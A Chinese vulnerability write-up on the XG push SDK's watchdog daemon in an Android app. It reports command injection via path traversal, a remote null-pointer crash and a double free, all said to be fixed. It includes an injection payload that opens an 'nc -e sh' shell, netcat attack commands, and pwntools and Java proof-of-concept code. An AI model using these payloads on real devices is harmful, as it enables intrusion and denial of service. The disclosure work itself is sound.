> 原文链接: https://www.anquanke.com//post/id/85107 


# 【技术分享】一个目录穿越引发的注入及后续——XG SDK漏洞 回顾与思考


                                阅读量   
                                **112797**
                            
                        |
                        
                                                                                    



**[![](https://p5.ssl.qhimg.com/t01ce6be0d1c79f3c45.png)](https://p5.ssl.qhimg.com/t01ce6be0d1c79f3c45.png)**

**0x00 简介**

XG SDK是一个流行的Android app推送SDK，有不少流行Android app均在使用，本文分析的版本主要针对100001_work_weixin_1.0.0.apk所使用的版本。

漏洞最初在2016年4月份的时候提交给了某云网站，厂商已经确认，但由于网站持续“升级”的缘故，不太可能公开细节了。后续漏洞也已经提交给了TSRC，时至现在，相关漏洞均已经完全修复，漏洞已经不影响使用该SDK的app了，因此本文决定对相关技术细节予以分享，并补充有关该漏洞后续的一些研究。

**<br>**

**0x01 漏洞分析**



XG SDK会周期性地启动一个libtpnsWatchdog.so的可执行文件，作为看门狗保活应用，并随机在55000~56000端口监听任意地址。

```
public static int getRandomPort() `{`
        return XGWatchdog.getRandomInt(1000) + 55000;
    `}`
```

在我们实验手机上的监听端口为55362，启动进程为com.tencent.wework lib目录下的libtpnsWatchdog.so

[![](https://p0.ssl.qhimg.com/t01ece318eb842e8a56.png)](https://p0.ssl.qhimg.com/t01ece318eb842e8a56.png)

[![](https://p0.ssl.qhimg.com/t01c7305bf31d6aa29f.png)](https://p0.ssl.qhimg.com/t01c7305bf31d6aa29f.png)

经过逆向分析，可发现这个开放端口支持一系列的文本命令，包括：
<li>
“ver:”，获取版本号
</li>
<li>
“debug:1”，打开调试
</li>
<li>
“xgapplist:”,获取或设置使用xg sdk的app
</li>
<li>
“tme:xxxx”，设置周期性启动服务的等待时间
</li>
<li>
“exit2:”，退出
</li>
<li>
例如，发送debug:1，可获得当前手机上使用XG的app列表及当前启动服务的等待时间等信息，可见，手机上有四个app使用了该推送sdk.
</li>
<li>
<pre>`echo -n “debug:1”  | nc 192.168.8.187 5536`</pre>
</li>
[![](https://p4.ssl.qhimg.com/t018c2300c15b9506e6.png)](https://p4.ssl.qhimg.com/t018c2300c15b9506e6.png)

当发送xgapplist:xxx，则可以设置当前使用xg sdk的app。其中xxx的形式为 &lt;packagename1&gt;,&lt;accid1&gt;;&lt;packagename2&gt;,&lt;accid2&gt;…

接下来会通过fopen打开/data/data/&lt;packagename&gt;/lib目录来判断指定packagename的目录是否存在，如果存在，则会在后续使用该packagename，否则提示找不到该package。

[![](https://p3.ssl.qhimg.com/t01ca9644190082c3b9.png)](https://p3.ssl.qhimg.com/t01ca9644190082c3b9.png)

然后，程序会调用system通过am命令启动对应包内的XG组件，这里就使用了上面检查过的packagename.

[![](https://p5.ssl.qhimg.com/t0111c1cfbd7e03c9d3.png)](https://p5.ssl.qhimg.com/t0111c1cfbd7e03c9d3.png)

注意，上述两个system函数中的参数没有进行任何过滤。

那么，我们结合上述两张图来看，**如果恶意app满足：**
<li>
1. 能够设置一个存在且被xg sdk可以访问的目录，
</li>
<li>
2. 目录名中嵌入执行的代码
</li>
<li>
那么就可以实现命令注入。对于条件1，可以通过../../../../路径穿越的形式跳转到恶意app可控的目录；而对于条件2，则可以利用shell特性，在可控目录下建立猥琐的“ || &lt;command&gt; #”目录实现。
</li>
<li>

</li>
<li>
**0x02  漏洞利用**
      （1）模拟恶意app在/sdcard目录建立一个特殊（猥琐）的目录名，除了“/“字符外，其他字符均可用。
</li>
[![](https://p5.ssl.qhimg.com/t0111c1cfbd7e03c9d3.png)](https://p5.ssl.qhimg.com/t0111c1cfbd7e03c9d3.png)

于是我们有了了” &amp;&amp; nc -ll -p 6666 -e sh #”的目录，并在目录下存在子目录lib

（2）通过xgapplist命令设置推送app

如图，发送命令，

```
echo -n “xgapplist:com.tencent.wework/../../../../../../sdcard/ &amp;&amp; nc -ll -p 6666 -e sh #,2100078991;” | nc -vv 192.168.8.187 55362
```

观察logcat可以发现设置成功。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01aede864132faecb8.png)

（3）通过tme命令，使am命令周期性进行，进而触发后面的system函数，执行我们的反弹shell命令

```
echo -n “tme:12345” | nc -v 192.168.8.187 55362
```

稍等片刻，观察logcat的打印信息后，可以尝试连接shell，成功连接

[![](https://p2.ssl.qhimg.com/t019e4a2d8773c75b85.png)](https://p2.ssl.qhimg.com/t019e4a2d8773c75b85.png)

u0_a113用户正好就是com.tencent.wework

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0172b56b68bdce9dd4.png)

下面就可以以com.tencent.wework的权限做任何事情了，比如访问私有目录、打开保护的activity、发广播等等。

**<br>**

**0x03 漏洞是否能够远程**



因为当时漏洞取名带有“远程”二字不够严谨，引发了厂商的争议。的确，从这个漏洞的成因来看，主要还是本地恶意app通过污染目录名，结合XG开放的端口，完成本地提权。但经瘦蛟舞的指点，可以考虑向受害者发送包含污染目录名的zip包（或者通过浏览器下载解压至/sdcard），然后结合XG监听端口的地址为任意地址，远程传入命令，进而实现远程命令执行，这种远程攻击相对难度较大，因为开放的端口为随机端口，攻击者也需要社工欺骗受害者接收zip包.

<br>

**0x04 空指针解引用远程拒绝服务**



当向XG监听端口发送xgapplist命令时，libtpnsWatchdog.so对后面的packagename和accid进行处理，但并没有检查“，”或“；“分割的字符串为空的情况，导致后面atoll函数去访问0地址的内存，造成空指针解引用crash。见如下代码：



```
v1 = a1;
  if ( a1 )
  `{`
    j_j_memset(xgapplist, 0, 0x200u);
    first_app = j_j_strtok(v1, “;”);
    v3 = 0;
    v2 = first_app;
    while ( 1 )
    `{`
      len_of_applist = v3;
      if ( !v2 )
        break;
      v5 = j_j_strlen(v2);
      v6 = v5 + 1;
      v7 = (void *)j_operator new[](v5 + 1);
      xgapplist[len_of_applist] = v7;
      j_j_memcpy(v7, v2, v6);
      v2 = j_j_strtok(0, “;”);
      v3 = len_of_applist + 1;
    `}`
    for ( i = 0; i &lt; len_of_applist; ++i )
    `{`
      v8 = (char *)xgapplist[i];
      if ( v8 )
      `{`
        package = j_j_strtok(v8, “,”);
        accid = j_j_strtok(0, “,”);
        v11 = accid;
        v12 = j_j_atoll(accid); //null pointer dereference crash !!!!
        v27 = v12;
```

向55362端口发送一个最简单的数据包，

```
echo -n "xgapplist:A" | nc -v 192.168.8.169 55362<br style="text-align: left">
```

使用logcat可观察到Oops：

```
I/DEBUG   (  243): *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***<br style="text-align: left">I/DEBUG   (  243): Build fingerprint: 'google/hammerhead/hammerhead:4.4.4/KTU84P/1227136:user/release-keys'<br style="text-align: left">I/DEBUG   (  243): Revision: '11'<br style="text-align: left">I/DEBUG   (  243): pid: 11774, tid: 11774, name: xg_watchdog  &gt;&gt;&gt; /data/data/com.tencent.wework/lib/libtpnsWatchdog.so &lt;&lt;&lt;<br style="text-align: left">I/DEBUG   (  243): signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 00000000<br style="text-align: left">I/DEBUG   (  243):     r0 4008a2d8  r1 40083d28  r2 ffffff78  r3 00000000<br style="text-align: left">I/DEBUG   (  243):     r4 400165c6  r5 00000002  r6 0000000a  r7 00000000<br style="text-align: left">I/DEBUG   (  243):     r8 400120d9  r9 00000000  sl 00000000  fp bed838ec<br style="text-align: left">I/DEBUG   (  243):     ip 40018f68  sp bed7f6e8  lr 400125e5  pc 4006aab0  cpsr 000f0030<br style="text-align: left">I/DEBUG   (  243):     d0  0000000000000000  d1  0000000000000000<br style="text-align: left">I/DEBUG   (  243):     d2  0000000000000000  d3  0000000000000000<br style="text-align: left">I/DEBUG   (  243):     d4  0000000000000000  d5  0000000000000000<br style="text-align: left">I/DEBUG   (  243):     d6  0000000000000000  d7  0000000000000000<br style="text-align: left">I/DEBUG   (  243):     d8  0000000000000000  d9  0000000000000000<br style="text-align: left">I/DEBUG   (  243):     d10 0000000000000000  d11 0000000000000000<br style="text-align: left">I/DEBUG   (  243):     d12 0000000000000000  d13 0000000000000000<br style="text-align: left">I/DEBUG   (  243):     d14 0000000000000000  d15 0000000000000000<br style="text-align: left">I/DEBUG   (  243):     d16 41db6820b9bcac08  d17 3f50624dd2f1a9fc<br style="text-align: left">I/DEBUG   (  243):     d18 419908a090000000  d19 0000000000000000<br style="text-align: left">I/DEBUG   (  243):     d20 0000000000000000  d21 0000000000000000<br style="text-align: left">I/DEBUG   (  243):     d22 0000000000000000  d23 0000000000000000<br style="text-align: left">I/DEBUG   (  243):     d24 0000000000000000  d25 0000000000000000<br style="text-align: left">I/DEBUG   (  243):     d26 0000000000000000  d27 0000000000000000<br style="text-align: left">I/DEBUG   (  243):     d28 0000000000000000  d29 0000000000000000<br style="text-align: left">I/DEBUG   (  243):     d30 0000000000000000  d31 0000000000000000<br style="text-align: left">I/DEBUG   (  243):     scr 00000010<br style="text-align: left">I/DEBUG   (  243):<br style="text-align: left">I/DEBUG   (  243): backtrace:<br style="text-align: left">I/DEBUG   (  243):     #00  pc 0002aab0  /system/lib/libc.so (strtoimax+31)<br style="text-align: left">I/DEBUG   (  243):     #01  pc 000015e1  /data/app-lib/com.tencent.wework-1/libtpnsWatchdog.so<br style="text-align: left">I/DEBUG   (  243):     #02  pc 00002787  /data/app-lib/com.tencent.wework-1/libtpnsWatchdog.so<br style="text-align: left">I/DEBUG   (  243):     #03  pc 0000124f  /data/app-lib/com.tencent.wework-1/libtpnsWatchdog.so<br style="text-align: left">I/DEBUG   (  243):     #04  pc 0000e34b  /system/lib/libc.so (__libc_init+50)<br style="text-align: left">I/DEBUG   (  243):     #05  pc 00001390  /data/app-lib/com.tencent.wework-1/libtpnsWatchdog.so<br style="text-align: left">I/DEBUG   (  243):<br style="text-align: left">
```

**<br>**

**0x05 double free内存破坏**



仍然观察xgapplist命令，程序接收socket端口传入的命令xgapplist:&lt;packagename&gt;,&lt;accid&gt;;&lt;packgename2&gt;,&lt;accid2&gt;;…;&lt;packagenamen&gt;,&lt;accidn&gt;; 时，程序会对上述命令进行解析，分配xgappinfo对象，并依次将不重复的xgappinfo（使用XG SDK的app的信息）对象存入全局数组xgappinfo_list

xgappinfo占用16字节，为如下结构体



```
struct xgappinfo `{`
    long accid,
    char* packgename,
    int  status
`}`;
```

如图，

[![](https://p5.ssl.qhimg.com/t01eac43ff0eae9be12.png)](https://p5.ssl.qhimg.com/t01eac43ff0eae9be12.png)

再来看下下面这段程序逻辑，对通过socket端口传入的xgapplist命令的解析主要包括以下几个步骤：
<li>
解析分号的分隔，获得每个xg app的信息；
</li>
<li>
解析逗号的分隔，获得xg app packagename和accid；
</li>
<li>
从0x4005E028开始，依次存储解析xgappinfo得到的结果，分别为accid、packagename、status，从而构成xgappinfo_list；
</li>
<li>
当再次传入xgapplist命令时，会将传入的packagename与已存储的packagename比较。如果不同，说明是新的packagename，则会在堆上分配地址存储，并将这个堆上分配的地址添加到xgappinfo_list中。如果相同，不进行添加。
</li>
<li>
最多只能添加到0x40060028这个地址，到这个地址会跳出循环，也就是最多只能添加(0x40060028-0x4005E028)/16=512个xgappinfo结构体

</li>
<li>

</li>
<li>
<pre><code class="hljs cpp">void __fastcall sub_40056574(char *a1)
`{`
  …
 int i; // [sp+24h] [bp-2Ch]@4
  unsigned __int64 v27; // [sp+28h] [bp-28h]@8
  v1 = a1;
  j_j_memset(dword_40060028, 0, 0x200u);
  v2 = j_j_strtok(v1, “;”);
  v3 = 0;
  v4 = v2;
  while ( 1 )
  `{`
    v25 = v3;
    if ( !v4 )
      break;
    v5 = j_j_strlen(v4);
    v6 = v5 + 1;
    v7 = (void *)j_operator new[](v5 + 1);
    dword_40060028[v25] = v7;
    j_j_memcpy(v7, v4, v6);
    v4 = j_j_strtok(0, “;”);
    v3 = v25 + 1;
  `}`
  for ( i = 0; i &lt; v25; ++i )
  `{`
    v8 = (char *)dword_40060028[i];
    if ( sub_4005651C(dword_40060028[i]) )
    `{`
      v9 = j_j_strtok(v8, “,”);
      v10 = j_j_strtok(0, “,”);
      v11 = v10;
      v12 = j_j_atoll(v10);
      v27 = v12;
      if ( v12 &lt;= 0x3B9AC9FF &amp;&amp; dword_4005D018 )
      `{`
        v23 = HIDWORD(v12);
        j_j___android_log_print(6, “xguardian”, “error accessid:%llu”);
      `}`
      if ( v9 &amp;&amp; v11 )
      `{`
        v13 = &amp;dword_4005E028;                  // xgapp_info结构体存储的起始地址
        for ( j = &amp;dword_4005E028; ; j = v15 )
        `{`
          v14 = (const char *)v13[2];
          v15 = v13;
          if ( !v14 )
            break;
          if ( !j_j_strcmp(v9, v14) )
          `{`
            *v13 = v27;
            v13[1] = HIDWORD(v27);
            v16 = 1;
            *((_BYTE *)v15 + 12) = 1;
            v15 = j;
            goto LABEL_22;
          `}`
          if ( *((_BYTE *)v13 + 12) )
            v15 = j;
          v13 += 4;
          if ( v13 == dword_40060028 )
            break;                              // 最多只能存储512个对象，每个对象占用16字节
        `}`
        v16 = 0;
LABEL_22:
        if ( dword_4005D018 )
          j_j___android_log_print(4, “xguardian”, “found %d, pkgName:%s,accid:%s”, v16, v9, v11);
        if ( !v16 &amp;&amp; sub_40055B98(v9) )
        `{`
          if ( dword_4005D018 )
            j_j___android_log_print(4, “xguardian”, “try to add to the unstall list”);
          v17 = j_j_strlen(v9) + 1;
          v18 = (void *)v15[2];
          if ( v18 )
          `{`
j_j__ZdaPv:
            operator delete[](v18);             // 这段存在问题，v18没有置为null。导致当循环到512个对象的时候，由于前面循环的限制，v18还是指向第512个对象中在堆上分配的packagename的地址，此时v18会被delete。
                                                //
                                                // 当512以上的多个命令数据包达到，需要有多个packagename需要添加时，由于并发处理，程序会在返回之前再次运行到此处，v18还是指向同一地址，由于v18已被delete，此时会再次delete一下，从而导致delete出错
            return;
          `}`
          v19 = (void *)j_operator new[](v17);
          v15[2] = (int)v19;
          j_j_memset(v19, 0, v17);
          j_j_memcpy((void *)v15[2], v9, v17);
          *(_BYTE *)(v15[2] + v17) = 0;
          v20 = j_j_atoll(v11);
          *((_BYTE *)v15 + 12) = 1;
          *(_QWORD *)v15 = v20;
          if ( dword_4005D018 )
            j_j___android_log_print(4, “xguardian”, “add new unInfo pkgName:%s,accid:%llu”, v15[2], v20);
        `}`
      `}`
    `}`
    v18 = (void *)dword_40060028[i];
    if ( v18 )
      goto j_j__ZdaPv;
  `}`
…</code></pre>
</li>
注意下面这段代码，



```
if ( v18 )
 
          `{`
j_j__ZdaPv:
            operator delete[](v18);  
`}`
```

v18为下一个未分配区域的packagename，XG SDK认为如果不为空，则表明已在堆上分配，因此需要delete。然而测试表明，当添加xgappinfo超过512，为518、519等多个时（注意：并非超过1个），可以触发堆内存破坏。



```
POC:
 from pwn import *
import sys
def open_connection():
    xg_daemon_server = “192.168.8.158”
    xg_listen_port = 55362
    conn = remote(xg_daemon_server, xg_listen_port)
    return conn
def send_debug():
    conn = open_connection()
    packet_debug = “debug:1n”
    conn.send(packet_debug)
    print “S:”+packet_debug
    conn.close()
    exit(0)
def send_heap_overflow(n):
    conn = open_connection()
    packet_bound_overflow = “xgapplist:../../../”
    for i in range(n):
        packet_bound_overflow +=”/”
    packet_bound_overflow +=”sdcard/, 2100178385n”
    print “S: “+packet_bound_overflow
    print “%d bytes” % len(packet_bound_overflow)
    conn.send(packet_bound_overflow)
    conn.close()
def send_normal_packet(packet):
    conn = open_connection()
    conn.send(packet)
    print “S: “+packet
    if (packet == “ver:n”):
        print “R: “+ conn.recv()
    conn.close()
    exit(0)
def main():
    if (len(sys.argv) != 2):
        print “””
           %s &lt;packet_type&gt;
           1: send debug packet
           3: send heap overflow packet
           4: send normal ver: packet
           5: send normal tme:12345 packet
           6: send normal xgapplist: packet
        “”” % sys.argv[0]
        exit(-1)
    if(sys.argv[1] == “1”):
        send_debug()
    elif(sys.argv[1] == “3”):
        for i in range(518):  //notice！
            send_heap_overflow(i)
            print i
        exit(0)
    elif(sys.argv[1] == “4”):
        send_normal_packet(“ver:n”)
    elif(sys.argv[1] == “5”):
        send_normal_packet(“tme:12345n”)
    elif(sys.argv[1] == “6”):
        send_normal_packet(“xgapplist:n”)
    else:
        print “unkown packet type! “
if __name__ == “__main__”:
    main()          
Logcat
 
I/TpnsWatchdog(  495): server get unstall appinfo:com.tencent.wework,2100178384;../../../././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.
I/TpnsWatchdog(  495): found 0, pkgName:com.tencent.wework,accid:2100178384
I/TpnsWatchdog(  495): try to add to the unstall list
F/libc    (  495): invalid address or address of corrupt block 0x4125f850 passed to dlfree
F/libc    (  495): Fatal signal 11 (SIGSEGV) at 0xdeadbaad (code=1), thread 495 (xg_watchdog)
I/DEBUG   (  241): *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
I/DEBUG   (  241): Build fingerprint: ‘google/hammerhead/hammerhead:4.4.4/KTU84P/1227136:user/release-keys’
I/DEBUG   (  241): Revision: ’11’
I/DEBUG   (  241): pid: 495, tid: 495, name: xg_watchdog  &gt;&gt;&gt; /data/data/com.tencent.wework/lib/libtpnsWatchdog.so &lt;&lt;&lt;
I/DEBUG   (  241): AM write failure (32 / Broken pipe)
I/DEBUG   (  241): signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr deadbaad
I/DEBUG   (  241): Abort message: ‘invalid address or address of corrupt block 0x4125f850 passed to dlfree’
W/NativeCrashListener(  960): Couldn’t find ProcessRecord for pid 495
I/DEBUG   (  241):     r0 00000000  r1 40139c5e  r2 deadbaad  r3 4013d7a0
I/DEBUG   (  241):     r4 4125f850  r5 40148180  r6 4121c000  r7 4125f858
I/DEBUG   (  241):     r8 400cc0d9  r9 00000000  sl 00000000  fp bee458ec
I/DEBUG   (  241):     ip 00000001  sp bee41710  lr 4010b6cb  pc 4010b6cc  cpsr 600f0030
I/DEBUG   (  241):     d0  2064657373617064  d1  6120726f2073736c
I/DEBUG   (  241):     d2  6f20737365726466  d3  707572726f632072
I/DEBUG   (  241):     d4  2e2f2e2f2e2f2e2f  d5  2e2f2e2f2e2f2e2f
I/DEBUG   (  241):     d6  2e2f2e2f2e2f2e2f  d7  2e2f2e2f2e2f2e2f
I/DEBUG   (  241):     d8  0000000000000000  d9  0000000000000000
I/DEBUG   (  241):     d10 0000000000000000  d11 0000000000000000
I/DEBUG   (  241):     d12 0000000000000000  d13 0000000000000000
I/DEBUG   (  241):     d14 0000000000000000  d15 0000000000000000
I/DEBUG   (  241):     d16 41c3183f70f5e354  d17 3f50624dd2f1a9fc
I/DEBUG   (  241):     d18 41c05bc240800000  d19 0000000000000000
I/DEBUG   (  241):     d20 0000000000000000  d21 0000000000000000
I/DEBUG   (  241):     d22 0000000000000000  d23 0000000000000000
I/DEBUG   (  241):     d24 0000000000000000  d25 0000000000000000
I/DEBUG   (  241):     d26 0000000000000000  d27 0000000000000000
I/DEBUG   (  241):     d28 0000000000000000  d29 0000000000000000
I/DEBUG   (  241):     d30 0000000000000000  d31 0000000000000000
I/DEBUG   (  241):     scr 00000010
I/DEBUG   (  241):
I/DEBUG   (  241): backtrace:
I/DEBUG   (  241):     #00  pc 000116cc  /system/lib/libc.so (dlfree+1191)
I/DEBUG   (  241):     #01  pc 0000dc0b  /system/lib/libc.so (free+10)
I/DEBUG   (  241):     #02  pc 000016b5  /data/app-lib/com.tencent.wework-1/libtpnsWatchdog.so
I/DEBUG   (  241):     #03  pc 00002787  /data/app-lib/com.tencent.wework-1/libtpnsWatchdog.so
I/DEBUG   (  241):     #04  pc 0000124f  /data/app-lib/com.tencent.wework-1/libtpnsWatchdog.so
I/DEBUG   (  241):     #05  pc 0000e34b  /system/lib/libc.so (__libc_init+50)
I/DEBUG   (  241):     #06  pc 00001390  /data/app-lib/com.tencent.wework-1/libtpnsWatchdog.so
I
```

为什么513、514不能触发呢？这个问题一直没有分析得很清楚，因此也没有选择提交，直至厂商对前面两个漏洞进行修复，再次复现这个漏洞的难度加大。



```
if ( v18 )
          `{`
j_j__ZdaPv:
            operator delete[](v18);  
`}`
```

再次观察漏洞的触发位置，可以发现v18 被delete后并没有置为null，那么有没有可能v18会被delete多次呢？作为socket服务daemon，程序使用了epoll系统调用，因此可以猜想这是并发处理的原因。在没有并发的情况下依次传入要添加的xgappinfo，在超过512个xgappinfo时，循环直接跳出，不会尝试添加这个xgappinfo，不会触及到下面delete所在的分支，这也是很长时间我通过调试很难复现该漏洞的原因。但如果存在并发，特别是在即将超过512个xgappinfo时，又传入了多个要添加的xgappinfo，那么由于并发处理，程序会同时尝试添加多个xgappinfo且不会认为超过了512个xgappinfo，此时v18均指向同一地址（即第512个对象中在堆上分配的packagename的地址），那么在v18被delete一次的情况下，紧接着会再次delete一下，从而导致delete出错。

**<br>**

**0x06 后续**



腾讯很快对命令注入和空指针解引用引发的远程拒绝服务漏洞进行了修复，主要修复点包括：
<li>
1. Socket端口监听任意地址改为监听本地地址。
</li>
<li>
2. 对Socket端口传入的命令进行了加密。
</li>
<li>
3. 对传入xgapplist中的packagename进行了过滤，特别是过滤了“／”字符，防止目录穿越。
</li>
<li>
这些防御措施导致我很难再复现最后一个堆内存破坏漏洞了，但通过深入分析，我们仍然可以通过：
</li>
<li>
1. 编写手机上运行的本地代码
</li>
<li>
2. 添加手机上已存在的packagename，要超过512个
</li>
<li>
3. 破解加密算法
</li>
<li>
来予以一一破解。首先，在手机上安装512个packganame(Oh my god! )，这个可以通过脚本解决。
</li>


```
#!/bin/bash
# Generate 512 apks, Build and Install
CURDIR=$(pwd)
for i in $(seq 512)
do
    cd $CURDIR
    DIR=”HelloWorld”$i
    PACKAGE=”com.ms509.helloworld”$i
    UNSIGNED_APK=$DIR”-release-unsigned.apk”
    SIGNED_APK=$i”.apk”
    android create project -n $DIR -t 13 -p $DIR -k $PACKAGE -a helloworld
    cd $CURDIR”/”$DIR
    ant release
    cd $CURDIR”/”$DIR”/bin”
# sign apk
    signapk.sh $UNSIGNED_APK $SIGNED_APK
    adb install $SIGNED_APK
done
```

其次，破解加密算法可以直接调用程序使用的加解密库，而不必真的破解。最后的POC关键代码如下，注意，我们在快超过512时sleep了一下，使XG SDK的处理能力跟上，然后后面再传入多个xgappinfo，这样有更大的几率触发并发。

```
directSendContent("debug:1");<br style="text-align: left">directSendContent("ver:");<br style="text-align: left">Log.d("testXG", "[+] Adding "+Integer.toString(m_appNameList.size()) + "fake xg apps");<br style="text-align: left">int i = 0;<br style="text-align: left">for (String xgapp:m_appNameList) `{`<br style="text-align: left">    if ((i++) &gt; 530)<br style="text-align: left">        break;<br style="text-align: left">    String cmd = "xgapplist:" + xgapp + "," +<br style="text-align: left">            Integer.toString((int)(Math.random()*1000000)) + ";";<br style="text-align: left">    Log.d("testXG", "[+] " + Integer.toString(i) + " Sending command: " + cmd);<br style="text-align: left">    if (i == 510) `{`<br style="text-align: left">        try `{`<br style="text-align: left">            sleep(1000);<br style="text-align: left">        `}` catch (InterruptedException e)`{`<br style="text-align: left"><br style="text-align: left">        `}`<br style="text-align: left">    `}`<br style="text-align: left">    directSendContent(cmd);<br style="text-align: left">
```



```
Logcat:
I/xguardian(19448): scanAppStatus node:508, pkg:heenstudy.com.sniffclipboard, accid:917429, status:1
I/xguardian(19448): scanAppStatus node:509, pkg:com.estrongs.android.taskmanager, accid:230582, status:1
I/xguardian(19448): scanAppStatus node:510, pkg:com.ilegendsoft.mercury, accid:995063, status:1
I/xguardian(19448): scanAppStatus node:511, pkg:fq.router2, accid:619048, status:1
I/xguardian(19448): xg app list size total:512, xgAppsCacheCount:512, xgAppsCacheActivityStatusCount:512
I/xguardian(19448): countTimeout=0, wait_time=310000, nfds=1, xgAppsCacheCount=512
I/xguardian(19448): server accept client 2, 127.0.0.1
I/xguardian(19448): countTimeout=0, wait_time=310000, nfds=1, xgAppsCacheCount=512
I/xguardian(19448): server decrpty receive from client: 42 : xgapplist:easyre.sjl.gossip.easyre,512970;
I/xguardian(19448): server get unstall appinfo:easyre.sjl.gossip.easyre,512970;
E/xguardian(19448): error accessid:512970
I/xguardian(19448): found 0, pkgName:easyre.sjl.gossip.easyre,accid:512970
I/xguardian(19448): try to add to the unstall list
E/testXG  (10149): [+] response: -1
F/libc    (19448): invalid address or address of corrupt block 0x401120c8 passed to dlfree
F/libc    (19448): Fatal signal 11 (SIGSEGV) at 0xdeadbaad (code=1), thread 19448 (xg_watchdog)
I/DEBUG   (  242): *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
I/DEBUG   (  242): Build fingerprint: ‘google/hammerhead/hammerhead:4.4.4/KTU84P/1227136:user/release-keys’
I/DEBUG   (  242): Revision: ’11’
I/DEBUG   (  242): pid: 19448, tid: 19448, name: xg_watchdog  &gt;&gt;&gt; /data/data/com.qufenqi.android.quwallet/lib/libxguardian.so &lt;&lt;&lt;
I/DEBUG   (  242): signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr deadbaad
I/DEBUG   (  242): AM write failure (32 / Broken pipe)
I/DEBUG   (  242): Abort message: ‘invalid address or address of corrupt block 0x401120c8 passed to dlfree’
I/DEBUG   (  242):     r0 00000000  r1 400b5c5e  r2 deadbaad  r3 400b97a0
I/DEBUG   (  242):     r4 401120c8  r5 400c4180  r6 4010e000  r7 401120d0
I/DEBUG   (  242):     r8 40047221  r9 00000000  sl 00000000  fp bec758dc
I/DEBUG   (  242):     ip 00000001  sp bec6f6f8  lr 400876cb  pc 400876cc  cpsr 600f0030
I/DEBUG   (  242):     d0  2064657373617064  d1  6f2073736572646c
I/DEBUG   (  242):     d2  707572726f632066  d3  206b636f6c622072
I/DEBUG   (  242):     d4  0000000000000000  d5  0000000000000000
I/DEBUG   (  242):     d6  0000000000000000  d7  0000000000000000
I/DEBUG   (  242):     d8  0000000000000000  d9  0000000000000000
I/DEBUG   (  242):     d10 0000000000000000  d11 0000000000000000
I/DEBUG   (  242):     d12 0000000000000000  d13 0000000000000000
I/DEBUG   (  242):     d14 0000000000000000  d15 0000000000000000
I/DEBUG   (  242):     d16 41c9ef5dd3bd0e56  d17 3f50624dd2f1a9fc
I/DEBUG   (  242):     d18 41ba01d435000000  d19 0000000000000000
I/DEBUG   (  242):     d20 0000000000000000  d21 0000000000000000
I/DEBUG   (  242):     d22 0000000000000000  d23 0000000000000000
I/DEBUG   (  242):     d24 0000000000000000  d25 0000000000000000
I/DEBUG   (  242):     d26 0000000000000000  d27 0000000000000000
I/DEBUG   (  242):     d28 0000000000000000  d29 0000000000000000
I/DEBUG   (  242):     d30 0000000000000000  d31 0000000000000000
I/DEBUG   (  242):     scr 00000010
I/DEBUG   (  242):
I/DEBUG   (  242): backtrace:
I/DEBUG   (  242):     #00  pc 000116cc  /system/lib/libc.so (dlfree+1191)
I/DEBUG   (  242):     #01  pc 0000dc0b  /system/lib/libc.so (free+10)
I/DEBUG   (  242):     #02  pc 000026e7  /data/app-lib/com.qufenqi.android.quwallet-2/libxguardian.so
I/DEBUG   (  242):     #03  pc 00002ff7  /data/app-lib/com.qufenqi.android.quwallet-2/libxguardian.so
I/DEBUG   (  242):     #04  pc 000013b1  /data/app-lib/com.qufenqi.android.quwallet-2/libxguardian.so
I/DEBUG   (  242):     #05  pc 0000e34b  /system/lib/libc.so (__libc_init+50)
I/DEBUG   (  242):     #06  pc 000014fc  /data/app-lib/com.qufenqi.android.quwallet-2/libxguardian.so
```

当然，这个double free漏洞无法利用，因为堆中的内容只能为手机上安装的packagename，所以尽管克服重重困难破解了加密算法、安装了512个packagename，仍然只是一个local DoS。TSRC在最先评级认为是代码执行，后面也更正为了local DoS。

最后，总结下漏洞的成因，XG SDK以检查/data/data/&lt;packagename&gt;/lib的存在，来判断是否为使用XG sdk的app，这种方式不够严谨。依然有可能被恶意app利用来保活（ 因为XG sdk后续要启动app的服务），占用系统资源或者妨碍正常使用推送服务的app。

<br style="text-align: left">
